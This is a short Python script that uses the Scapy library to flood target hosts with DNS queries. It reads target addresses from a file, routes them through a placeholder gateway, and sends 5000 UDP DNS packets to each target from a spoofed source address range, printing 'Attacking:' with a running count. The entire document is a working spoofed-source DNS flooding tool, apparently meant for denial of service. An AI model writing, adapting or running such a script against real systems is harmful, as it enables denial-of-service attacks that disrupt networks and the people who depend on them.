from scapy.all import *
file = open('ip.txt', 'r').readlines()
for line in file:
    lines = line.rstrip()
    conf.route.add(host=(lines),gw="X.X.X.X")
    x=0
    for x in range (0, 5000):
        answer = send(IP(src='9.0.0.0/30', dst=(lines))/UDP(dport=53)/DNS(rd=3,qd=DNSQR(qname='NETSEC RULES!!!!'+str(x))),verbose=0)
        print ('Attacking:'+ " "+(str(lines))+"  "+'DNS_Queries#:'+' '+(str(x)))
